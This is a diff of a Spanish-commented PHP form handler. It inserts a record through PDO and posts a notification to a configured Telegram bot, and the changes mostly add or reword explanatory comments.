@@ -1,11 +1,13 @@
 <?php
 session_start();
-include '../../../../assets/config/conexion.php';
+// Estos includes están correctos y $conn es un objeto PDO
+include '../../../../assets/config/conexion.php'; 
 $config = include '../../../../assets/config/config.php';
 
 // --- FUNCIÓN DE TELEGRAM CORREGIDA ---
 // Se añadió '\\' a la lista para evitar el error 400 Bad Request
 function escapeMarkdownV2($text) {
+    // La doble barra \\ es el primer carácter que debe escaparse
     $specialChars = ['\\', '_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
     foreach ($specialChars as $char) {
         $text = str_replace($char, "\\" . $char, $text);
@@ -32,9 +34,11 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $estado = 1; // Estado inicial
         
         // 2. En PDO, los valores se pasan en un array a execute()
+        //    Esto reemplaza a bind_param()
         $stmt_insert->execute([$estado]);
         
         // 3. En PDO, se usa fetchColumn() para obtener el ID devuelto
+        //    Esto reemplaza a insert_id
         $nuevo_id = $stmt_insert->fetchColumn(); 
 
         // 4. No se usa close() en PDO de esta manera
@@ -42,7 +46,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         // --- FIN DE LA SECCIÓN CORREGIDA ---
 
 
-        // Enviar datos a Telegram (esta parte estaba bien)
+        // Enviar datos a Telegram
         $botToken = $config['telegram']['bot_token'];
         $chatId = $config['telegram']['chat_id'];
         $baseUrl = $config['base_url'];
@@ -80,7 +84,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                 'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                 'method'  => 'POST',
                 'content' => http_build_query($data),
-                'ignore_errors' => true // Ayuda a depurar si Telegram sigue fallando
+                'ignore_errors' => true // Para poder leer la respuesta de error de Telegram
             ]
         ];
 
@@ -88,9 +92,10 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $context = stream_context_create($options);
         $result = file_get_contents($url, false, $context);
 
+        // Verificamos si la respuesta de Telegram no fue un "200 OK"
         if ($result === FALSE || strpos($http_response_header[0], "200 OK") === false) {
             // Error al enviar
-            $error_details = $result; // El $result contendrá la respuesta de error de Telegram
+            $error_details = $result; // $result contiene el JSON de error de Telegram
             file_put_contents('telegram_debug_log.txt', "Error: " . print_r($error_details, true) . "\nDatos enviados: " . print_r($data, true), FILE_APPEND);
             die('Error al enviar mensaje a Telegram');
         }
